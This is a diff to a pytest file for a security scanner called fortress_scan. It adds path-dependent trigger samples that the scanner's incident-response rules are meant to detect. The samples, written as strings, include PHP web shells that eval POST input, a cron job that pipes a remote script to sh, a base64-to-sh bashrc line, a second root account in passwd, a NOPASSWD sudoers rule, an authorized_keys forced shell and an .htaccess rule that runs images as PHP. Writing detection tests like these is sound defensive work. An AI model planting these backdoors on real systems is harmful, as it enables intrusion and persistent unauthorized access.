@@ -9,7 +9,17 @@ import pytest
 from fortress_scan.core.config import Config
 from fortress_scan.core.engine import scan_source
 from fortress_scan.core.registry import all_rules
-from fortress_scan.languages import CSHARP, JAVA, JAVASCRIPT, MANIFEST, PYTHON, SHELL, WORKFLOW
+from fortress_scan.languages import (
+    CSHARP,
+    IR_ARTIFACT,
+    JAVA,
+    JAVASCRIPT,
+    MANIFEST,
+    PHP,
+    PYTHON,
+    SHELL,
+    WORKFLOW,
+)
 
 BIDI_OVERRIDE = chr(0x202E)
 ZERO_WIDTH_SPACE = chr(0x200B)
@@ -19,6 +29,16 @@ FORM_FEED = chr(0x0C)
 
 def rule_ids(language: str, source: str):
     return [f.rule_id for f in scan_source(source, language, "mau", Config())]
+
+
+def rule_ids_at(language: str, source: str, path: str):
+    """Như `rule_ids` nhưng đặt mẫu vào một ĐƯỜNG DẪN cụ thể.
+
+    Họ FSB-IR kết luận dựa cả vào vị trí tệp -- `uploads/x.php` và
+    `src/x.php` là hai sự việc khác nhau với cùng một nội dung -- nên đường
+    dẫn "mau" cố định ở trên không diễn đạt được mẫu của chúng.
+    """
+    return [f.rule_id for f in scan_source(source, language, path, Config())]
 
 
 TRIGGERS: Dict[str, Tuple[str, str]] = {
@@ -558,11 +578,63 @@ SAFE_VARIANTS.update(
         ),
     }
 )
+# Mau cho cac rule phu thuoc duong dan: (ngon ngu, duong dan, ma nguon).
+#
+# Mau an toan tuong ung KHONG nam o day ma o tests/test_ir_compromise.py: ho
+# FSB-IR can chung minh im lang tren ca MOT CAY thu muc ( cron sach, khoa SSH
+# that, passwd that ), ma SAFE_VARIANTS chi dien dat duoc mot tep roi.
+PATH_TRIGGERS: Dict[str, Tuple[str, str, str]] = {
+    "FSB-IR-001": (
+        PHP,
+        "uploads/avatar.php",
+        "<?php\n@error_reporting(0);\n$c = $_POST['c'];\neval(base64_decode($c));\n",
+    ),
+    "FSB-IR-002": (
+        PHP,
+        "lib/stage.php",
+        "<?php\neval(gzinflate(base64_decode('S0mtKC4pAgA=')));\n",
+    ),
+    "FSB-IR-003": (
+        PHP,
+        "lib/gate.php",
+        "<?php\nif (md5($_POST['p']) === '21232f297a') {\n    system($_POST['c']);\n}\n",
+    ),
+    "FSB-IR-010": (
+        IR_ARTIFACT,
+        "etc/cron.d/sync",
+        "*/5 * * * * root curl -s http://198.51.100.7/a.sh | sh\n",
+    ),
+    "FSB-IR-011": (
+        IR_ARTIFACT,
+        "etc/systemd/system/helper.service",
+        "[Service]\nExecStart=/tmp/.cache/helper\n",
+    ),
+    "FSB-IR-012": (IR_ARTIFACT, "home/app/.bashrc", "echo aWQK | base64 -d | sh\n"),
+    "FSB-IR-013": (IR_ARTIFACT, "etc/ld.so.preload", "/lib/x86_64-linux-gnu/libnet.so\n"),
+    "FSB-IR-014": (
+        IR_ARTIFACT,
+        "root/.ssh/authorized_keys",
+        'command="/bin/bash -i" ssh-rsa AAAAB3Nza ke\n',
+    ),
+    "FSB-IR-015": (
+        IR_ARTIFACT,
+        "etc/passwd",
+        "root:x:0:0:root:/root:/bin/bash\nsysmon:x:0:0::/home/s:/bin/bash\n",
+    ),
+    "FSB-IR-016": (IR_ARTIFACT, "etc/sudoers.d/90-app", "app ALL=(ALL) NOPASSWD: ALL\n"),
+    "FSB-IR-017": (
+        IR_ARTIFACT,
+        "uploads/.htaccess",
+        "AddHandler application/x-httpd-php .php .jpg\n",
+    ),
+}
+
+ALL_TRIGGER_IDS = set(TRIGGERS) | set(PATH_TRIGGERS)
 
 
 def test_every_registered_rule_has_a_trigger():
     registered = {rule.id for rule in all_rules()}
-    missing = sorted(registered - set(TRIGGERS))
+    missing = sorted(registered - ALL_TRIGGER_IDS)
     assert missing == [], (
         "cac rule sau chua co mau kich hoat trong TRIGGERS, "
         "moi rule moi bat buoc phai co: %s" % missing
@@ -571,8 +643,20 @@ def test_every_registered_rule_has_a_trigger():
 
 def test_no_trigger_refers_to_an_unknown_rule():
     registered = {rule.id for rule in all_rules()}
-    unknown = sorted(set(TRIGGERS) - registered)
+    unknown = sorted(ALL_TRIGGER_IDS - registered)
     assert unknown == [], "TRIGGERS nhac toi rule khong ton tai: %s" % unknown
+
+
+def test_no_rule_appears_in_both_trigger_tables():
+    """Hai bang cung dinh nghia mot rule thi mot ban se bi sua mot minh."""
+    assert set(TRIGGERS) & set(PATH_TRIGGERS) == set()
+
+
+@pytest.mark.parametrize("rule_id", sorted(PATH_TRIGGERS))
+def test_path_rule_fires_on_its_trigger(rule_id: str):
+    language, path, source = PATH_TRIGGERS[rule_id]
+    found = rule_ids_at(language, source, path)
+    assert rule_id in found, "%s khong kich hoat; thuc te nhan duoc: %s" % (rule_id, found)
 
 
 @pytest.mark.parametrize("rule_id", sorted(TRIGGERS))
